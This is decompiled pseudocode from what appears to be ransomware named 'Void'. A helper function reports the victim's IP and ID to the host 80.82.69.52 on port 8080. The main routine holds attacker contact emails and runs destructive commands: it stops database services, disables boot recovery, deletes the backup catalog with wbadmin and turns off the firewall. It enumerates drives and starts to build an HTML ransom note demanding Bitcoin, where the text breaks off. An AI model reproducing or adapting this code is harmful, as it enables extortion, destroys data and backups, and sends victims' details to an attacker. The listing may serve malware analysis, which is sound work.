// 4BA968: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';
// 4BA970: using guessed type void *CryptoPP::PKCS8PrivateKey::`vftable';

//----- (00414D70) --------------------------------------------------------
void __cdecl sub_414D70(
        _BYTE *a1,
        int a2,
        int a3,
        int a4,
        int a5,
        unsigned int a6,
        _BYTE *a7,
        int a8,
        int a9,
        int a10,
        int a11,
        unsigned int a12)
{
  void *v12; // edx
  void *v13; // edx
  void *v14; // edx
  void *v15; // edx
  void *v16; // edx
  void *v17; // edx
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  int v23; // eax
  void *v24; // edx
  void *v25; // edx
  void *v26; // edx
  void *v27; // edx
  void *v28; // edx
  void *v29; // edx
  void *v30; // edx
  void *v31; // edx
  _BYTE *v32; // ecx
  _BYTE *v33; // ecx
  int v34; // [esp+0h] [ebp-274h] BYREF
  int v35[5]; // [esp+10h] [ebp-264h] BYREF
  unsigned int v36; // [esp+24h] [ebp-250h]
  int v37[5]; // [esp+28h] [ebp-24Ch] BYREF
  unsigned int v38; // [esp+3Ch] [ebp-238h]
  int v39[5]; // [esp+40h] [ebp-234h] BYREF
  unsigned int v40; // [esp+54h] [ebp-220h]
  int v41[5]; // [esp+58h] [ebp-21Ch] BYREF
  unsigned int v42; // [esp+6Ch] [ebp-208h]
  int v43[5]; // [esp+70h] [ebp-204h] BYREF
  unsigned int v44; // [esp+84h] [ebp-1F0h]
  int v45[5]; // [esp+88h] [ebp-1ECh] BYREF
  unsigned int v46; // [esp+9Ch] [ebp-1D8h]
  size_t v47[5]; // [esp+A0h] [ebp-1D4h] BYREF
  unsigned int v48; // [esp+B4h] [ebp-1C0h]
  int v49[5]; // [esp+B8h] [ebp-1BCh] BYREF
  unsigned int v50; // [esp+CCh] [ebp-1A8h]
  size_t v51[5]; // [esp+D0h] [ebp-1A4h] BYREF
  unsigned int v52; // [esp+E4h] [ebp-190h]
  size_t v53[5]; // [esp+E8h] [ebp-18Ch] BYREF
  unsigned int v54; // [esp+FCh] [ebp-178h]
  size_t v55[5]; // [esp+100h] [ebp-174h] BYREF
  unsigned int v56; // [esp+114h] [ebp-160h]
  size_t v57[5]; // [esp+118h] [ebp-15Ch] BYREF
  unsigned int v58; // [esp+12Ch] [ebp-148h]
  size_t v59[18]; // [esp+130h] [ebp-144h] BYREF
  void *v60[11]; // [esp+178h] [ebp-FCh] BYREF
  __int64 v61; // [esp+1A4h] [ebp-D0h] BYREF
  _DWORD *v62[17]; // [esp+1ACh] [ebp-C8h] BYREF
  int v63[5]; // [esp+1F0h] [ebp-84h] BYREF
  unsigned int v64; // [esp+204h] [ebp-70h]
  int v65[5]; // [esp+208h] [ebp-6Ch] BYREF
  unsigned int v66; // [esp+21Ch] [ebp-58h]
  struct in_addr v67[2]; // [esp+220h] [ebp-54h] BYREF
  unsigned int v68; // [esp+228h] [ebp-4Ch]
  unsigned int v69; // [esp+22Ch] [ebp-48h]
  unsigned int v70; // [esp+230h] [ebp-44h]
  unsigned int v71; // [esp+234h] [ebp-40h]
  unsigned int v72; // [esp+238h] [ebp-3Ch]
  unsigned int v73; // [esp+23Ch] [ebp-38h]
  unsigned int v74; // [esp+240h] [ebp-34h]
  unsigned int v75; // [esp+244h] [ebp-30h]
  unsigned int v76; // [esp+248h] [ebp-2Ch]
  unsigned int v77; // [esp+24Ch] [ebp-28h]
  unsigned int v78; // [esp+250h] [ebp-24h]
  unsigned int v79; // [esp+254h] [ebp-20h]
  unsigned int v80; // [esp+258h] [ebp-1Ch]
  unsigned int v81; // [esp+25Ch] [ebp-18h]
  int *v82; // [esp+264h] [ebp-10h]
  int v83; // [esp+270h] [ebp-4h]

  v82 = &v34;
  v83 = 2;
  sub_468A50(&v61, 4000);
  sub_419B80((int)v63, "active");
  LOBYTE(v83) = 3;
  sub_419B80((int)v65, "detive");
  LOBYTE(v83) = 4;
  sub_428910(v67, qword_4F0148);
  sub_42A6D0((int)v59);
  LOBYTE(v83) = 5;
  memset(v62, 0, sizeof(v62));
  sub_419B80((int)v55, &unk_4CCC25);
  LOBYTE(v83) = 6;
  sub_419B80((int)v47, "/");
  LOBYTE(v83) = 7;
  sub_42A740((char *)v62, v47, 0, v55);
  LOBYTE(v83) = 9;
  if ( v48 >= 0x10 )
  {
    v81 = v48 + 1;
    v12 = (void *)v47[0];
    if ( v48 + 1 >= 0x1000 )
    {
      v81 = v48 + 36;
      v12 = *(void **)(v47[0] - 4);
      if ( v47[0] - (unsigned int)v12 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v12);
  }
  v47[4] = 0;
  v48 = 15;
  LOBYTE(v47[0]) = 0;
  LOBYTE(v83) = 10;
  if ( v56 >= 0x10 )
  {
    v80 = v56 + 1;
    v13 = (void *)v55[0];
    if ( v56 + 1 >= 0x1000 )
    {
      v80 = v56 + 36;
      v13 = *(void **)(v55[0] - 4);
      if ( v55[0] - (unsigned int)v13 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v13);
  }
  v55[4] = 0;
  v56 = 15;
  LOBYTE(v55[0]) = 0;
  sub_419B80((int)v53, "80.82.69.52");
  LOBYTE(v83) = 11;
  sub_431C00((int)v59, v53, 8080);
  LOBYTE(v83) = 10;
  if ( v54 >= 0x10 )
  {
    v79 = v54 + 1;
    v14 = (void *)v53[0];
    if ( v54 + 1 >= 0x1000 )
    {
      v79 = v54 + 36;
      v14 = *(void **)(v53[0] - 4);
      if ( v53[0] - (unsigned int)v14 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v14);
  }
  v53[4] = 0;
  v54 = 15;
  LOBYTE(v53[0]) = 0;
  sub_431F40(v62, 1);
  sub_419B80((int)v51, "/status");
  LOBYTE(v83) = 12;
  sub_431F50((void **)v62, v51);
  LOBYTE(v83) = 10;
  if ( v52 >= 0x10 )
  {
    v78 = v52 + 1;
    v15 = (void *)v51[0];
    if ( v52 + 1 >= 0x1000 )
    {
      v78 = v52 + 36;
      v15 = *(void **)(v51[0] - 4);
      if ( v51[0] - (unsigned int)v15 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v15);
  }
  v51[4] = 0;
  v52 = 15;
  LOBYTE(v51[0]) = 0;
  sub_431F20(v62, 1, 1);
  sub_419B80((int)v57, "me");
  LOBYTE(v83) = 13;
  sub_419B80((int)v49, "From");
  LOBYTE(v83) = 14;
  sub_431B30((int *)v62, v49, v57);
  LOBYTE(v83) = 13;
  if ( v50 >= 0x10 )
  {
    v77 = v50 + 1;
    v16 = (void *)v49[0];
    if ( v50 + 1 >= 0x1000 )
    {
      v77 = v50 + 36;
      v16 = *(void **)(v49[0] - 4);
      if ( (unsigned int)(v49[0] - (_DWORD)v16 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v16);
  }
  v49[4] = 0;
  v50 = 15;
  LOBYTE(v49[0]) = 0;
  LOBYTE(v83) = 10;
  if ( v58 >= 0x10 )
  {
    v76 = v58 + 1;
    v17 = (void *)v57[0];
    if ( v58 + 1 >= 0x1000 )
    {
      v76 = v58 + 36;
      v17 = *(void **)(v57[0] - 4);
      if ( v57[0] - (unsigned int)v17 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v17);
  }
  v57[4] = 0;
  v58 = 15;
  LOBYTE(v57[0]) = 0;
  v18 = (char *)sub_428FD0(v67, (int)v35);
  LOBYTE(v83) = 15;
  v19 = (char *)sub_421FB0((int)v37, "&ip=", v18);
  LOBYTE(v83) = 16;
  v20 = (char *)sub_421F20((int)v39, v19, "&id=");
  LOBYTE(v83) = 17;
  v21 = (char *)sub_422050((int)v41, v20, &a1);
  LOBYTE(v83) = 18;
  v22 = (char *)sub_421F20((int)v43, v21, "&mail=");
  LOBYTE(v83) = 19;
  v23 = sub_422050((int)v45, v22, &a7);
  LOBYTE(v83) = 20;
  sub_431B00((void **)v62, v23);
  LOBYTE(v83) = 19;
  if ( v46 >= 0x10 )
  {
    v75 = v46 + 1;
    v24 = (void *)v45[0];
    if ( v46 + 1 >= 0x1000 )
    {
      v75 = v46 + 36;
      v24 = *(void **)(v45[0] - 4);
      if ( (unsigned int)(v45[0] - (_DWORD)v24 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v24);
  }
  v45[4] = 0;
  v46 = 15;
  LOBYTE(v45[0]) = 0;
  LOBYTE(v83) = 18;
  if ( v44 >= 0x10 )
  {
    v74 = v44 + 1;
    v25 = (void *)v43[0];
    if ( v44 + 1 >= 0x1000 )
    {
      v74 = v44 + 36;
      v25 = *(void **)(v43[0] - 4);
      if ( (unsigned int)(v43[0] - (_DWORD)v25 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v25);
  }
  v43[4] = 0;
  v44 = 15;
  LOBYTE(v43[0]) = 0;
  LOBYTE(v83) = 17;
  if ( v42 >= 0x10 )
  {
    v73 = v42 + 1;
    v26 = (void *)v41[0];
    if ( v42 + 1 >= 0x1000 )
    {
      v73 = v42 + 36;
      v26 = *(void **)(v41[0] - 4);
      if ( (unsigned int)(v41[0] - (_DWORD)v26 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v26);
  }
  v41[4] = 0;
  v42 = 15;
  LOBYTE(v41[0]) = 0;
  LOBYTE(v83) = 16;
  if ( v40 >= 0x10 )
  {
    v72 = v40 + 1;
    v27 = (void *)v39[0];
    if ( v40 + 1 >= 0x1000 )
    {
      v72 = v40 + 36;
      v27 = *(void **)(v39[0] - 4);
      if ( (unsigned int)(v39[0] - (_DWORD)v27 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v27);
  }
  v39[4] = 0;
  v40 = 15;
  LOBYTE(v39[0]) = 0;
  LOBYTE(v83) = 15;
  if ( v38 >= 0x10 )
  {
    v71 = v38 + 1;
    v28 = (void *)v37[0];
    if ( v38 + 1 >= 0x1000 )
    {
      v71 = v38 + 36;
      v28 = *(void **)(v37[0] - 4);
      if ( (unsigned int)(v37[0] - (_DWORD)v28 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v28);
  }
  v37[4] = 0;
  v38 = 15;
  LOBYTE(v37[0]) = 0;
  LOBYTE(v83) = 10;
  if ( v36 >= 0x10 )
  {
    v70 = v36 + 1;
    v29 = (void *)v35[0];
    if ( v36 + 1 >= 0x1000 )
    {
      v70 = v36 + 36;
      v29 = *(void **)(v35[0] - 4);
      if ( (unsigned int)(v35[0] - (_DWORD)v29 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v29);
  }
  v35[4] = 0;
  v36 = 15;
  LOBYTE(v35[0]) = 0;
  memset(v60, 0, sizeof(v60));
  sub_430D40(v59, (int)v60, v62, qword_4F0148);
  sub_413190(v60);
  LOBYTE(v83) = 5;
  sub_413070((void **)v62);
  LOBYTE(v83) = 4;
  sub_412F60(v59);
  LOBYTE(v83) = 3;
  if ( v66 >= 0x10 )
  {
    v69 = v66 + 1;
    v30 = (void *)v65[0];
    if ( v66 + 1 >= 0x1000 )
    {
      v69 = v66 + 36;
      v30 = *(void **)(v65[0] - 4);
      if ( (unsigned int)(v65[0] - (_DWORD)v30 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v30);
  }
  v65[4] = 0;
  v66 = 15;
  LOBYTE(v65[0]) = 0;
  LOBYTE(v83) = 2;
  if ( v64 >= 0x10 )
  {
    v68 = v64 + 1;
    v31 = (void *)v63[0];
    if ( v64 + 1 >= 0x1000 )
    {
      v68 = v64 + 36;
      v31 = *(void **)(v63[0] - 4);
      if ( (unsigned int)(v63[0] - (_DWORD)v31 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v31);
  }
  v63[4] = 0;
  v64 = 15;
  LOBYTE(v63[0]) = 0;
  v83 = 0;
  if ( a6 >= 0x10 )
  {
    v32 = a1;
    if ( a6 + 1 >= 0x1000 )
    {
      v32 = (_BYTE *)*((_DWORD *)a1 - 1);
      if ( (unsigned int)(a1 - v32 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v32);
  }
  a5 = 0;
  a6 = 15;
  LOBYTE(a1) = 0;
  v83 = -1;
  if ( a12 >= 0x10 )
  {
    v33 = a7;
    if ( a12 + 1 >= 0x1000 )
    {
      v33 = (_BYTE *)*((_DWORD *)a7 - 1);
      if ( (unsigned int)(a7 - v33 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v33);
  }
  a11 = 0;
  a12 = 15;
  LOBYTE(a7) = 0;
}
// 4F0148: using guessed type __int64 qword_4F0148;
// 414D70: using guessed type size_t var_144[18];

//----- (00415630) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edi
  FILE *v4; // eax
  int v5; // eax
  _DWORD *i; // esi
  CHAR *v7; // eax
  UINT DriveTypeA; // eax
  CHAR *v9; // eax
  const WCHAR *v10; // eax
  int v11; // eax
  unsigned int v12; // ecx
  void *v13; // edx
  unsigned int v14; // ecx
  CHAR *v15; // edx
  void **v16; // esi
  char *v17; // esi
  char *v18; // ecx
  char *v19; // edi
  char *v20; // eax
  unsigned int v21; // ecx
  char *v22; // esi
  void **v23; // esi
  char *v24; // esi
  char *v25; // ecx
  int *v26; // eax
  int *v27; // eax
  int *v28; // eax
  int *v29; // eax
  int *v30; // eax
  int v31; // edi
  unsigned int v32; // esi
  void **v33; // eax
  void **v34; // eax
  int v35; // edi
  void **v36; // eax
  void **v37; // eax
  int v38; // edi
  void **v39; // eax
  int v40; // edi
  void **v41; // eax
  void **v42; // eax
  int v43; // edi
  unsigned int v44; // edi
  unsigned int v45; // edx
  void *v46; // ecx
  unsigned int v47; // edi
  unsigned int v48; // edx
  void *v49; // ecx
  unsigned int v50; // edi
  DWORD v51; // edx
  void *v52; // ecx
  unsigned int v53; // edi
  unsigned int v54; // edx
  void *v55; // ecx
  unsigned int v56; // edx
  void *v57; // ecx
  int *j; // esi
  CHAR *v59; // eax
  UINT v60; // eax
  CHAR *v61; // edx
  char *v62; // eax
  char *v63; // edx
  _Thrd_imp_t *v64; // eax
  _DWORD *v65; // ecx
  _Thrd_imp_t *v66; // eax
  int v67; // ecx
  _Thrd_imp_t *v68; // eax
  int v69; // ecx
  _Thrd_imp_t *v70; // eax
  int v71; // ecx
  _Thrd_imp_t *v72; // eax
  int v73; // ecx
  _Thrd_imp_t *v74; // eax
  int v75; // ecx
  _Thrd_imp_t *v76; // eax
  int v77; // ecx
  unsigned int v78; // ecx
  void *v79; // edx
  unsigned int v80; // edx
  CHAR *v81; // ecx
  int *k; // esi
  CHAR *v83; // eax
  UINT v84; // eax
  CHAR *v85; // edx
  char *v86; // eax
  char *v87; // edx
  int v88; // ecx
  _Thrd_imp_t *v89; // eax
  int v90; // ecx
  _Thrd_imp_t *v91; // eax
  int v92; // ecx
  _Thrd_imp_t *v93; // eax
  int v94; // ecx
  unsigned int v95; // ecx
  void *v96; // edx
  unsigned int v97; // edx
  CHAR *v98; // ecx
  unsigned int v99; // ecx
  void *v100; // edx
  unsigned int v101; // edx
  void *v102; // ecx
  unsigned int v103; // edx
  void *v104; // ecx
  unsigned int v105; // edx
  void *v106; // ecx
  unsigned int v107; // edx
  void *v108; // ecx
  __int64 v109; // rax
  unsigned int v110; // edx
  void *v111; // ecx
  unsigned int v112; // edx
  __int64 v113; // rax
  unsigned int v114; // edx
  unsigned int v115; // edx
  void *v116; // ecx
  unsigned int v117; // edx
  void *v118; // ecx
  unsigned int v119; // edx
  void *v120; // ecx
  unsigned int v121; // edx
  void *v122; // ecx
  _BYTE *v124; // [esp-28h] [ebp-324h] BYREF
  int v125; // [esp-24h] [ebp-320h]
  int v126; // [esp-20h] [ebp-31Ch]
  int v127; // [esp-1Ch] [ebp-318h]
  _BYTE *v128; // [esp-18h] [ebp-314h] BYREF
  unsigned int v129; // [esp-14h] [ebp-310h]
  _BYTE *v130; // [esp-10h] [ebp-30Ch] BYREF
  int v131; // [esp-Ch] [ebp-308h]
  __int64 v132; // [esp-8h] [ebp-304h]
  unsigned __int64 v133; // [esp+0h] [ebp-2FCh] BYREF
  _Thrd_imp_t v134; // [esp+30h] [ebp-2CCh] BYREF
  _Thrd_imp_t v135; // [esp+38h] [ebp-2C4h] BYREF
  _Thrd_imp_t v136; // [esp+40h] [ebp-2BCh] BYREF
  _Thrd_imp_t v137; // [esp+48h] [ebp-2B4h] BYREF
  __int128 v138; // [esp+50h] [ebp-2ACh] BYREF
  __int64 v139; // [esp+60h] [ebp-29Ch]
  __int128 v140; // [esp+68h] [ebp-294h] BYREF
  __int64 v141; // [esp+78h] [ebp-284h]
  _Thrd_imp_t v142; // [esp+80h] [ebp-27Ch] BYREF
  _Thrd_imp_t v143; // [esp+88h] [ebp-274h] BYREF
  _Thrd_imp_t v144; // [esp+90h] [ebp-26Ch] BYREF
  void *v145[4]; // [esp+98h] [ebp-264h] BYREF
  int v146; // [esp+A8h] [ebp-254h]
  unsigned int v147; // [esp+ACh] [ebp-250h]
  __int128 v148; // [esp+B0h] [ebp-24Ch] BYREF
  ULARGE_INTEGER v149; // [esp+C0h] [ebp-23Ch] BYREF
  __int128 v150; // [esp+C8h] [ebp-234h] BYREF
  ULARGE_INTEGER v151; // [esp+D8h] [ebp-224h]
  unsigned int v152; // [esp+E0h] [ebp-21Ch]
  char *v153; // [esp+E4h] [ebp-218h]
  FILE *v154[44]; // [esp+E8h] [ebp-214h] BYREF
  int v155[5]; // [esp+198h] [ebp-164h] BYREF
  unsigned int v156; // [esp+1ACh] [ebp-150h]
  unsigned int v157; // [esp+1B0h] [ebp-14Ch]
  unsigned int v158; // [esp+1B4h] [ebp-148h]
  unsigned int v159; // [esp+1B8h] [ebp-144h]
  unsigned int v160; // [esp+1BCh] [ebp-140h]
  unsigned int v161; // [esp+1C0h] [ebp-13Ch]
  int v162[5]; // [esp+1C4h] [ebp-138h] BYREF
  unsigned int v163; // [esp+1D8h] [ebp-124h]
  void *v164[4]; // [esp+1DCh] [ebp-120h] BYREF
  int v165; // [esp+1ECh] [ebp-110h]
  unsigned int v166; // [esp+1F0h] [ebp-10Ch]
  void *v167[4]; // [esp+1F4h] [ebp-108h] BYREF
  unsigned int v168; // [esp+204h] [ebp-F8h]
  unsigned int v169; // [esp+208h] [ebp-F4h]
  _DWORD *v170; // [esp+20Ch] [ebp-F0h]
  void *v171[4]; // [esp+210h] [ebp-ECh] BYREF
  int v172; // [esp+220h] [ebp-DCh]
  unsigned int v173; // [esp+224h] [ebp-D8h]
  __int64 v174; // [esp+228h] [ebp-D4h] BYREF
  int v175; // [esp+230h] [ebp-CCh]
  void *v176[4]; // [esp+234h] [ebp-C8h] BYREF
  int v177; // [esp+244h] [ebp-B8h]
  unsigned int v178; // [esp+248h] [ebp-B4h]
  __int64 v179; // [esp+24Ch] [ebp-B0h]
  int v180; // [esp+254h] [ebp-A8h]
  void *v181[4]; // [esp+258h] [ebp-A4h] BYREF
  unsigned int v182; // [esp+268h] [ebp-94h]
  unsigned int v183; // [esp+26Ch] [ebp-90h]
  void *v184[4]; // [esp+270h] [ebp-8Ch] BYREF
  unsigned int v185; // [esp+280h] [ebp-7Ch]
  unsigned int v186; // [esp+284h] [ebp-78h]
  __int64 v187; // [esp+288h] [ebp-74h] BYREF
  int v188; // [esp+290h] [ebp-6Ch]
  __int64 v189; // [esp+294h] [ebp-68h] BYREF
  int v190; // [esp+29Ch] [ebp-60h]
  int v191[4]; // [esp+2A0h] [ebp-5Ch] BYREF
  int v192; // [esp+2B0h] [ebp-4Ch]
  unsigned int v193; // [esp+2B4h] [ebp-48h]
  __int64 v194; // [esp+2B8h] [ebp-44h] BYREF
  int v195; // [esp+2C0h] [ebp-3Ch]
  int RootPathName[4]; // [esp+2C4h] [ebp-38h] BYREF
  unsigned int v197; // [esp+2D4h] [ebp-28h]
  unsigned int v198; // [esp+2D8h] [ebp-24h]
  int *v199; // [esp+2DCh] [ebp-20h]
  int v200[4]; // [esp+2E0h] [ebp-1Ch] BYREF
  int v201; // [esp+2F8h] [ebp-4h]
  int savedregs; // [esp+2FCh] [ebp+0h] BYREF

  v200[3] = (int)&v133;
  v3 = 0;
  v152 = 0;
  set_terminate(sub_417040);
  FreeConsole();
  v4 = __acrt_iob_func(1u);
  v5 = _fileno(v4);
  _setmode(v5, 0x40000);
  v172 = 0;
  v173 = 15;
  LOBYTE(v171[0]) = 0;
  sub_41EF80(v171, "stevenxx134@gmail.com", 0x15u);
  v201 = 0;
  v168 = 0;
  v169 = 7;
  LOWORD(v167[0]) = 0;
  sub_41EB20(v167, L"steven77xx@mail.ru    and  Steven77xx@protonmail.com ", 0x35u);
  LOBYTE(v201) = 1;
  v165 = 0;
  v166 = 15;
  LOBYTE(v164[0]) = 0;
  sub_41EF80(v164, ".Void", 5u);
  LOBYTE(v201) = 2;
  sub_48F108("net stop SQLWriter");
  sub_48F108("net stop SQLBrowser");
  sub_48F108("net stop MSSQLSERVER");
  sub_48F108("net stop MSSQL$CONTOSO1");
  sub_48F108("net stop MSDTC");
  sub_48F108("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
  sub_48F108("bcdedit /set {default} recoveryenabled no");
  sub_48F108("wbadmin delete catalog -quiet");
  sub_48F108("net stop SQLSERVERAGENT");
  sub_48F108("net stop MSSQLSERVER");
  sub_48F108("net stop vds");
  sub_48F108("netsh advfirewall set  currentprofile state off");
  sub_48F108("netsh firewall set opmode mode=disable");
  LOBYTE(v201) = 3;
  sub_40FF70();
  v201 = 2;
  v174 = 0i64;
  v175 = 0;
  sub_40FE30((int *)&v174);
  LOBYTE(v201) = 6;
  v170 = 0;
  for ( i = (_DWORD *)v174; ; i += 6 )
  {
    v170 = i;
    if ( (unsigned int)i >= HIDWORD(v174) )
      break;
    sub_419BE0(RootPathName, i);
    LOBYTE(v201) = 7;
    v7 = (CHAR *)RootPathName;
    if ( v198 >= 0x10 )
      v7 = (CHAR *)RootPathName[0];
    DriveTypeA = GetDriveTypeA(v7);
    v199 = (int *)DriveTypeA;
    if ( DriveTypeA != 5 && DriveTypeA != 6 && DriveTypeA && sub_4234F0(RootPathName, byte_4CCC25) && v199 != (int *)2 )
    {
      LOBYTE(v153) = 0;
      v199 = v191;
      LOBYTE(v201) = 8;
      v9 = (CHAR *)RootPathName;
      if ( v198 >= 0x10 )
        v9 = (CHAR *)RootPathName[0];
      sub_427E80((int)v153, v9, v197);
      v3 &= ~2u;
      v152 = v3;
      LOBYTE(v201) = 9;
      v10 = (const WCHAR *)v191;
      if ( v193 >= 8 )
        v10 = (const WCHAR *)v191[0];
      v11 = __std_fs_space(v10, &v149, (PULARGE_INTEGER)&v148, (PULARGE_INTEGER)&v148 + 1);
      if ( v11 )
        sub_404980("space", v11, (WCHAR *)v191, SHIDWORD(v133));
      v150 = v148;
      v151 = v149;
      LOBYTE(v201) = 7;
      if ( v193 >= 8 )
      {
        v12 = 2 * v193 + 2;
        v160 = v12;
        v13 = (void *)v191[0];
        if ( v12 >= 0x1000 )
        {
          v12 = 2 * v193 + 37;
          v160 = v12;
          v13 = *(void **)(v191[0] - 4);
          if ( (unsigned int)(v191[0] - (_DWORD)v13 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        LODWORD(v133) = v12;
        sub_46C87D(v13);
      }
      v192 = 0;
      v193 = 7;
      LOWORD(v191[0]) = 0;
      qword_4F1510 += v150 - *((_QWORD *)&v150 + 1);
    }
    LOBYTE(v201) = 6;
    if ( v198 >= 0x10 )
    {
      v14 = v198 + 1;
      v161 = v198 + 1;
      v15 = (CHAR *)RootPathName[0];
      if ( v198 + 1 >= 0x1000 )
      {
        v14 = v198 + 36;
        v161 = v198 + 36;
        v15 = *(CHAR **)(RootPathName[0] - 4);
        if ( (unsigned int)(RootPathName[0] - (_DWORD)v15 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      LODWORD(v133) = v14;
      sub_46C87D(v15);
    }
    v197 = 0;
    v198 = 15;
    LOBYTE(RootPathName[0]) = 0;
  }
  v201 = 5;
  v132 = qword_4F1510 / 1024;
  qword_4F1510 = qword_4F1510 / 1024 / 0x100000;
  v189 = 0i64;
  v190 = 0;
  v133 = qword_4F1510;
  v153 = (char *)&v128;
  sub_419BE0(&v128, v171);
  LOBYTE(v201) = 5;
  sub_413430((int)&v189, (int)&savedregs, v3, (int)i, v128, v129, (int)v130, v131, v132, HIDWORD(v132), v133);
  LOBYTE(v201) = 13;
  sub_411E60(v162);
  v194 = 0i64;
  v195 = 0;
  v179 = 0i64;
  v180 = 0;
  v187 = 0i64;
  v188 = 0;
  LOBYTE(v201) = 17;
  v16 = v171;
  if ( v173 >= 0x10 )
    v16 = (void **)v171[0];
  v17 = (char *)v16 + v172;
  v18 = (char *)v171;
  if ( v173 >= 0x10 )
    v18 = (char *)v171[0];
  v153 = v18;
  v185 = 0;
  v186 = 7;
  LOWORD(v184[0]) = 0;
  sub_419280(v184, v17 - v18);
  sub_427DF0(v184, v153, v17, (int)v153);
  LOBYTE(v201) = 18;
  v19 = (char *)(v189 + 24);
  v20 = (char *)(v189 + 24);
  v21 = *(_DWORD *)(v189 + 44);
  if ( v21 >= 0x10 )
    v20 = *(char **)v19;
  v22 = &v20[*(_DWORD *)(v189 + 40)];
  if ( v21 >= 0x10 )
    v19 = *(char **)v19;
  v182 = 0;
  v183 = 7;
  LOWORD(v181[0]) = 0;
  sub_419280(v181, v22 - v19);
  sub_427DF0(v181, v19, v22, (int)v153);
  LOBYTE(v201) = 19;
  v23 = v164;
  if ( v166 >= 0x10 )
    v23 = (void **)v164[0];
  v24 = (char *)v23 + v165;
  v25 = (char *)v164;
  if ( v166 >= 0x10 )
    v25 = (char *)v164[0];
  v153 = v25;
  v177 = 0;
  v178 = 7;
  LOWORD(v176[0]) = 0;
  sub_419280(v176, v24 - v25);
  sub_427DF0(v176, v153, v24, (int)v153);
  LOBYTE(v201) = 20;
  qmemcpy(v200, "10903", 5);
  v26 = v162;
  if ( v163 >= 0x10 )
    v26 = (int *)v162[0];
  LOBYTE(v200[0]) = *(_BYTE *)v26;
  v27 = v162;
  if ( v163 >= 0x10 )
    v27 = (int *)v162[0];
  BYTE1(v200[0]) = *((_BYTE *)v27 + 1);
  v28 = v162;
  if ( v163 >= 0x10 )
    v28 = (int *)v162[0];
  BYTE2(v200[0]) = *((_BYTE *)v28 + 2);
  v29 = v162;
  if ( v163 >= 0x10 )
    v29 = (int *)v162[0];
  HIBYTE(v200[0]) = *((_BYTE *)v29 + 3);
  v30 = v162;
  if ( v163 >= 0x10 )
    v30 = (int *)v162[0];
  LOBYTE(v200[1]) = *((_BYTE *)v30 + 4);
  LOBYTE(v201) = 21;
  v146 = 0;
  v147 = 7;
  LOWORD(v145[0]) = 0;
  v31 = v152 | 8;
  v152 |= 8u;
  v32 = v182;
  sub_419280(v145, v182 + 2966);
  sub_419370(
    (int)v145,
    L"<html><head><meta http-equiv='X-UA-Compatible' content='IE=11' /><script type='text/javascript'>window.resizeTo(wind"
     "ow.screen.width,window.screen.height);</script><style>body {            background-color: #f7f5ff;             text"
     "-align: center;        }      #h1{text-shadow: -2px -2px #a2faf6;          color: black;          transition: font-"
     "size 1s;      }        #h1:hover{      font-size: 50px;        }        #d1{            background-color: #a9e4e9; "
     " width: 93%;            height: 190px;            margin: auto;            text-align: center;            border-ra"
     "dius: 13px;            font-size: 14pt;            padding-top: 10px;            transition: width 1s, height 1s ,f"
     "ont-size  1s;            font-weight: bold;        }        #d2{            background-color: #a9e4e9;            w"
     "idth: 93%;            height: 150px;            margin: auto;            margin-top: 16px;            text-align: c"
     "enter;            border-radius: 13px;            font-size: 14pt;            padding-top: 10px;            transit"
     "ion: width 1s, height 1s ,font-size  1s;            font-weight: bold;        }        #d1:hover{            box-sh"
     "adow:-4px -4px 10px black;            height: 190px;            width: 95%;            font-size: 15pt;        }   "
     "     #d2:hover{            box-shadow:-4px -4px 10px black;            height: 170px;            width: 95%;       "
     "     font-size: 15pt;        }        #d3{            background-color: #a9e4e9;            width: 93%;            "
     "height: 90px;            margin: auto;            margin-top: 10px;            text-align: center;            borde"
     "r-radius: 13px;            font-size: 14pt;            padding-top: 10px;            transition: width 1s, height 1"
     "s ,font-size  1s;            font-weight: bold;        }        #d3:hover{            box-shadow:-4px -4px 10px bla"
     "ck;            height: 100px;            width: 95%;            font-size: 15pt;        }    </style>    <title>ENC"
     "RYPTED</title></head><body><img src='https://i.ibb.co/2PXVhhm/1.png' height='90px' width='90px'/><h1 id='h1'>Your F"
     "iles has Been Encrypted</h1><div id='d1'>Your Files Has Been Encrypted with AES + RSA Algorithm <br/> If You Need Y"
     "our Files You Have To Pay Decryption Price <br/> You can Send Some Little Files Less Than 1MB for Test (The Test Fi"
     "les Should not Contain valuable Data Like Databases Large Excel Sheets or Backups <br/> After 48 Hour Decryption Pr"
     "ice Will be Doubled so You Better Contact us Before Times Up<br> Using Recovery Tools or 3rd Party Application May "
     "cause Damage To Your Files And increase price </div><div id='d2'>The Steps You Should Do To Get Your Files Back: <b"
     "r>1- Contact Email on Files And Send ID on The Files Then Do agreement on a Price</br>2- Send Some Files for Decryp"
     "tion Test ( Dont Pay to Anyone Else who is Not Able to Decrypt Your Test Files!) <br>After Geting Test Files Pay Th"
     "e price in Bitcoin And Get Decryption Tool + RSA key</br></div><div id='d3'>Your Case ID :",
    0xB96u);
